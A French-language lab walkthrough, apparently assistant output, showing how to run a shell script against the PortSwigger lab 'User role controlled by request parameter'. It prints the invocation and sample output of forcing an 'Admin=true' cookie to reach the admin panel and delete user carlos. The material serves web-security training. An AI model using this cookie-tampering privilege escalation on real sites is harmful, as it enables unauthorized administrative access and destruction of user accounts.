Voici un **exemple d’exploitation** du script présenté pour le lab PortSwigger  
**User role controlled by request parameter** où l’accès admin dépend du cookie `Admin=true` :

---

## **1. Lancement du script**

Supposons que l’URL du lab soit :

```
https://acb11f1e1f3e4b2ac0b1c2d3e4f5g6h7.web-security-academy.net
```

Lancez le script :

```bash
chmod +x cookie_admin_true.sh
./cookie_admin_true.sh https://acb11f1e1f3e4b2ac0b1c2d3e4f5g6h7.web-security-academy.net
```

---

## **2. Déroulement étape par étape**

### **PHASE DE CONNEXION**
```
=== PHASE DE CONNEXION ===
[*] Connexion à l'utilisateur wiener...
[+] Cookie de session récupéré : session=3z4h5k6l7m8n9p0q1r2s3t4u5v6w7x8y
[*] On force le cookie Admin=true pour la suite.
```

### **PHASE D'ATTAQUE**
```
=== PHASE D'ATTAQUE ===
[*] Accès au panneau admin avec Admin=true...
[+] Lien de suppression trouvé : /admin/delete?username=carlos
[*] Suppression de carlos...
```

### **PHASE DE CONTRÔLE**
```
=== PHASE DE CONTRÔLE ===
[+] Succès : le lab semble résolu !
```

---
